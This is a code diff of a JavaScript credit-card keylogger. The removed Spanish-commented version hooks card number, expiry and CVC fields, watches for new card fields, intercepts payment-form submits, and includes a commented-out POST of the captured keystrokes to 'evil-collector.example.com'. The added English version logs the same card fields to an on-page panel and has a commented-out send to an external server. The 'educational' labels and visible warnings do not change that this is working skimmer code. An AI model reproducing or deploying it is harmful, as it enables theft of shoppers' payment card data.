@@ -1,270 +1,221 @@
-// Keylogger para campos específicos de tarjeta de crédito
-// ⚠️ SOLO PARA PROPÓSITOS EDUCATIVOS Y TESTING ⚠️
+// Keylogger for Educational/Testing Purposes Only
+// Captures data from cc_number, cc_exp, and cc_cvc fields
 
-(function () {
-  "use strict";
-
-  // Buffer para almacenar las pulsaciones
-  let keylogBuffer = {
-    cc_number: [],
-    cc_exp: [],
-    cc_cvc: [],
-  };
-
-  // Función para registrar pulsaciones
-  function logKeyStroke(fieldName, event) {
-    const keystrokeData = {
-      field: fieldName,
-      key: event.key,
-      keyCode: event.keyCode,
-      value: event.target.value,
-      timestamp: new Date().toISOString(),
-      type: event.type,
+(function() {
+    'use strict';
+    
+    // Create display panel
+    const logPanel = document.createElement('div');
+    logPanel.id = 'keylogger-panel';
+    logPanel.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        width: 300px;
+        max-height: 400px;
+        background: rgba(0, 0, 0, 0.9);
+        color: #00ff00;
+        font-family: 'Courier New', monospace;
+        font-size: 12px;
+        padding: 15px;
+        border-radius: 8px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        z-index: 9999;
+        overflow-y: auto;
+        backdrop-filter: blur(10px);
+        border: 1px solid #333;
+    `;
+    
+    // Create header
+    const header = document.createElement('div');
+    header.innerHTML = `
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 8px;">
+            <span style="color: #ff6b6b; font-weight: bold;">🔍 KEYLOGGER MONITOR</span>
+            <button id="clear-log" style="background: #ff4757; color: white; border: none; padding: 2px 8px; border-radius: 3px; cursor: pointer; font-size: 10px;">Clear</button>
+        </div>
+    `;
+    
+    // Create log content area
+    const logContent = document.createElement('div');
+    logContent.id = 'log-content';
+    logContent.style.cssText = `
+        max-height: 300px;
+        overflow-y: auto;
+        line-height: 1.4;
+    `;
+    
+    logPanel.appendChild(header);
+    logPanel.appendChild(logContent);
+    document.body.appendChild(logPanel);
+    
+    // Storage for captured data
+    const capturedData = {
+        cc_number: '',
+        cc_exp: '',
+        cc_cvc: ''
     };
-
-    // Agregar al buffer específico del campo
-    keylogBuffer[fieldName].push(keystrokeData);
-
-    // Log en consola para debugging
-    console.log(`[KEYLOGGER] ${fieldName}:`, keystrokeData);
-
-    // Enviar datos cada 5 pulsaciones (simulación)
-    if (keylogBuffer[fieldName].length % 5 === 0) {
-      exfiltrateData(fieldName, keylogBuffer[fieldName]);
-    }
-  }
-
-  // Función para simular exfiltración de datos
-  function exfiltrateData(fieldName, data) {
-    const payload = {
-      field: fieldName,
-      keystrokes: data,
-      sessionId: generateSessionId(),
-      userAgent: navigator.userAgent,
-      url: window.location.href,
-      timestamp: new Date().toISOString(),
-    };
-
-    // Simular envío a servidor malicioso
-    console.log(`[EXFILTRATION] Enviando datos de ${fieldName}:`, payload);
-
-    // En un ataque real, esto sería algo como:
-    // fetch('https://evil-collector.example.com/keylog', {
-    //     method: 'POST',
-    //     body: JSON.stringify(payload)
-    // });
-
-    // Para demo, solo mostrar en consola
-    displayCapturedData(fieldName, payload);
-  }
-
-  // Generar ID de sesión único
-  function generateSessionId() {
-    return "session_" + Math.random().toString(36).substr(2, 9);
-  }
-
-  // Mostrar datos capturados en la página (para demo)
-  function displayCapturedData(fieldName, data) {
-    let displayDiv = document.getElementById("keylog-display");
-    if (!displayDiv) {
-      displayDiv = document.createElement("div");
-      displayDiv.id = "keylog-display";
-      displayDiv.style.cssText = `
-                position: fixed;
-                top: 10px;
-                right: 10px;
-                width: 300px;
-                max-height: 400px;
-                overflow-y: auto;
-                background: rgba(255,0,0,0.9);
-                color: white;
-                padding: 10px;
-                border-radius: 5px;
-                font-size: 12px;
-                z-index: 9999;
-                font-family: monospace;
-            `;
-      displayDiv.innerHTML = "<strong>🔴 KEYLOGGER ACTIVO</strong><br>";
-      document.body.appendChild(displayDiv);
-    }
-
-    const entry = document.createElement("div");
-    entry.style.cssText =
-      "border-bottom: 1px solid #fff; margin: 5px 0; padding: 5px 0;";
-    entry.innerHTML = `
-            <strong>${fieldName}:</strong><br>
-            Keys: ${data.keystrokes.map((k) => k.key).join("")}<br>
-            Value: ${
-              data.keystrokes[data.keystrokes.length - 1]?.value || ""
-            }<br>
-            <small>${new Date().toLocaleTimeString()}</small>
+    
+    // Target fields
+    const targetFields = ['cc_number', 'cc_exp', 'cc_cvc'];
+    
+    // Logging function
+    function logToPanel(fieldName, value, eventType) {
+        const timestamp = new Date().toLocaleTimeString();
+        const logEntry = document.createElement('div');
+        logEntry.style.cssText = `
+            margin-bottom: 8px;
+            padding: 6px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+            border-left: 3px solid #00ff00;
         `;
-    displayDiv.appendChild(entry);
-
-    // Limitar entradas mostradas
-    if (displayDiv.children.length > 10) {
-      displayDiv.removeChild(displayDiv.children[1]);
-    }
-  }
-
-  // Instalar keyloggers en campos específicos
-  function installKeyloggers() {
-    const targetFields = ["cc_number", "cc_exp", "cc_cvc"];
-
-    targetFields.forEach((fieldName) => {
-      // Buscar el campo por name
-      const field = document.querySelector(`input[name="${fieldName}"]`);
-
-      if (field) {
-        console.log(`[KEYLOGGER] Instalando keylogger en: ${fieldName}`);
-
-        // Eventos de teclado
-        field.addEventListener("keydown", (e) => logKeyStroke(fieldName, e));
-        field.addEventListener("keyup", (e) => logKeyStroke(fieldName, e));
-        field.addEventListener("keypress", (e) => logKeyStroke(fieldName, e));
-
-        // Eventos de input y cambio
-        field.addEventListener("input", (e) => logKeyStroke(fieldName, e));
-        field.addEventListener("change", (e) => logKeyStroke(fieldName, e));
-
-        // Eventos de paste
-        field.addEventListener("paste", (e) => {
-          setTimeout(() => {
-            logKeyStroke(fieldName, {
-              ...e,
-              key: "PASTE",
-              type: "paste",
-            });
-          }, 10);
-        });
-
-        // Marcar como interceptado
-        field.dataset.keyloggerInstalled = "true";
-      } else {
-        console.warn(`[KEYLOGGER] Campo no encontrado: ${fieldName}`);
-      }
-    });
-  }
-
-  // Monitorear cambios en el DOM para campos dinámicos
-  function monitorDOMChanges() {
-    const observer = new MutationObserver((mutations) => {
-      mutations.forEach((mutation) => {
-        if (mutation.addedNodes) {
-          mutation.addedNodes.forEach((node) => {
-            if (node.nodeType === Node.ELEMENT_NODE) {
-              // Buscar nuevos campos de tarjeta
-              const newFields = node.querySelectorAll(
-                'input[name="cc_number"], input[name="cc_exp"], input[name="cc_cvc"]'
-              );
-              if (newFields.length > 0) {
-                console.log(
-                  "[KEYLOGGER] Nuevos campos detectados, reinstalando..."
-                );
-                setTimeout(installKeyloggers, 100);
-              }
-            }
-          });
-        }
-      });
-    });
-
-    observer.observe(document.body, {
-      childList: true,
-      subtree: true,
-    });
-  }
-
-  // Capturar datos del formulario al enviar
-  function interceptFormSubmit() {
-    document.addEventListener("submit", function (e) {
-      const form = e.target;
-      if (
-        form.id === "payment-form" ||
-        form.querySelector('input[name="cc_number"]')
-      ) {
-        console.log("[KEYLOGGER] Interceptando envío de formulario...");
-
-        // Capturar todos los datos del formulario
-        const formData = new FormData(form);
-        const allData = {};
-        for (let [key, value] of formData.entries()) {
-          allData[key] = value;
-        }
-
-        // Combinar con keylog data
-        const completePayload = {
-          formData: allData,
-          keylogData: keylogBuffer,
-          submitTime: new Date().toISOString(),
-          userAgent: navigator.userAgent,
-          url: window.location.href,
+        
+        const fieldColor = {
+            'cc_number': '#4ecdc4',
+            'cc_exp': '#45b7d1',
+            'cc_cvc': '#f9ca24'
         };
-
-        console.log("[KEYLOGGER] Datos completos capturados:", completePayload);
-        exfiltrateData("FORM_SUBMIT", [completePayload]);
-      }
-    });
-  }
-
-  // API para acceso externo (debugging)
-  window.KeyloggerAPI = {
-    getBuffer: () => keylogBuffer,
-    clearBuffer: () => {
-      keylogBuffer = { cc_number: [], cc_exp: [], cc_cvc: [] };
-      console.log("[KEYLOGGER] Buffer limpiado");
-    },
-    exportData: () => {
-      const blob = new Blob([JSON.stringify(keylogBuffer, null, 2)], {
-        type: "application/json",
-      });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      a.href = url;
-      a.download = "keylog_data.json";
-      a.click();
-    },
-  };
-
-  // Inicialización
-  function init() {
-    console.log("[KEYLOGGER] 🔴 INICIANDO KEYLOGGER DE TARJETAS DE CRÉDITO");
-    console.log("[KEYLOGGER] ⚠️ SOLO PARA PROPÓSITOS EDUCATIVOS");
-
-    // Esperar a que el DOM esté listo
-    if (document.readyState === "loading") {
-      document.addEventListener("DOMContentLoaded", () => {
-        installKeyloggers();
-        monitorDOMChanges();
-        interceptFormSubmit();
-      });
-    } else {
-      installKeyloggers();
-      monitorDOMChanges();
-      interceptFormSubmit();
+        
+        logEntry.innerHTML = `
+            <div style="color: #888; font-size: 10px;">[${timestamp}] ${eventType.toUpperCase()}</div>
+            <div style="color: ${fieldColor[fieldName] || '#00ff00'}; font-weight: bold;">
+                📝 ${fieldName.toUpperCase()}: <span style="color: #fff;">${value || '(empty)'}</span>
+            </div>
+        `;
+        
+        logContent.appendChild(logEntry);
+        logContent.scrollTop = logContent.scrollHeight;
+        
+        // Update captured data
+        capturedData[fieldName] = value;
+        updateSummary();
     }
-
-    // Mostrar advertencia visual
-    setTimeout(() => {
-      if (document.body) {
-        const warning = document.createElement("div");
-        warning.style.cssText = `
-                    position: fixed;
-                    bottom: 10px;
-                    left: 10px;
-                    background: red;
-                    color: white;
-                    padding: 10px;
-                    border-radius: 5px;
-                    font-weight: bold;
-                    z-index: 9999;
-                `;
-        warning.textContent = "🔴 KEYLOGGER ACTIVO - DEMO EDUCATIVO";
-        document.body.appendChild(warning);
-      }
-    }, 1000);
-  }
-
-  // Ejecutar con pequeño delay
-  setTimeout(init, Math.random() * 1000);
+    
+    // Update summary display
+    function updateSummary() {
+        let existingSummary = document.getElementById('data-summary');
+        if (existingSummary) {
+            existingSummary.remove();
+        }
+        
+        const summary = document.createElement('div');
+        summary.id = 'data-summary';
+        summary.style.cssText = `
+            margin-top: 10px;
+            padding: 10px;
+            background: rgba(255, 107, 107, 0.2);
+            border-radius: 4px;
+            border: 1px solid #ff6b6b;
+        `;
+        
+        summary.innerHTML = `
+            <div style="color: #ff6b6b; font-weight: bold; margin-bottom: 5px;">💳 CAPTURED DATA:</div>
+            <div style="font-size: 11px; line-height: 1.3;">
+                <div>🔢 Card: <span style="color: #4ecdc4;">${capturedData.cc_number || 'Not captured'}</span></div>
+                <div>📅 Exp: <span style="color: #45b7d1;">${capturedData.cc_exp || 'Not captured'}</span></div>
+                <div>🔒 CVC: <span style="color: #f9ca24;">${capturedData.cc_cvc || 'Not captured'}</span></div>
+            </div>
+        `;
+        
+        logContent.appendChild(summary);
+    }
+    
+    // Clear log function
+    document.getElementById('clear-log').addEventListener('click', function() {
+        logContent.innerHTML = '';
+        Object.keys(capturedData).forEach(key => capturedData[key] = '');
+        logToPanel('system', 'Log cleared', 'info');
+    });
+    
+    // Wait for DOM to be ready
+    function initKeylogger() {
+        targetFields.forEach(fieldName => {
+            const field = document.getElementById(fieldName);
+            if (field) {
+                // Capture keystrokes
+                field.addEventListener('input', function(e) {
+                    logToPanel(fieldName, e.target.value, 'input');
+                });
+                
+                // Capture focus events
+                field.addEventListener('focus', function(e) {
+                    logToPanel(fieldName, 'Field focused', 'focus');
+                });
+                
+                // Capture blur events
+                field.addEventListener('blur', function(e) {
+                    logToPanel(fieldName, e.target.value, 'blur');
+                });
+                
+                // Capture paste events
+                field.addEventListener('paste', function(e) {
+                    setTimeout(() => {
+                        logToPanel(fieldName, e.target.value, 'paste');
+                    }, 10);
+                });
+                
+                console.log(`🔍 Keylogger attached to field: ${fieldName}`);
+            } else {
+                console.warn(`⚠️ Field not found: ${fieldName}`);
+            }
+        });
+        
+        // Initial log
+        logToPanel('system', 'Keylogger initialized', 'info');
+        updateSummary();
+    }
+    
+    // Initialize when DOM is ready
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initKeylogger);
+    } else {
+        initKeylogger();
+    }
+    
+    // Also capture form submission
+    document.addEventListener('submit', function(e) {
+        if (e.target.id === 'payment-form') {
+            logToPanel('system', 'Form submitted with captured data', 'submit');
+            
+            // Log final captured data to console for testing
+            console.log('🎯 FINAL CAPTURED DATA:', capturedData);
+            
+            // Could send to external server here (for educational purposes)
+            // fetch('https://your-test-server.com/log', {
+            //     method: 'POST',
+            //     headers: { 'Content-Type': 'application/json' },
+            //     body: JSON.stringify({
+            //         timestamp: new Date().toISOString(),
+            //         data: capturedData,
+            //         userAgent: navigator.userAgent,
+            //         page: window.location.href
+            //     })
+            // });
+        }
+    });
+    
+    // Make panel draggable (optional)
+    let isDragging = false;
+    let dragOffset = { x: 0, y: 0 };
+    
+    header.addEventListener('mousedown', function(e) {
+        isDragging = true;
+        dragOffset.x = e.clientX - logPanel.offsetLeft;
+        dragOffset.y = e.clientY - logPanel.offsetTop;
+        logPanel.style.cursor = 'grabbing';
+    });
+    
+    document.addEventListener('mousemove', function(e) {
+        if (isDragging) {
+            logPanel.style.left = (e.clientX - dragOffset.x) + 'px';
+            logPanel.style.top = (e.clientY - dragOffset.y) + 'px';
+            logPanel.style.right = 'auto';
+        }
+    });
+    
+    document.addEventListener('mouseup', function() {
+        isDragging = false;
+        logPanel.style.cursor = 'default';
+    });
+    
 })();
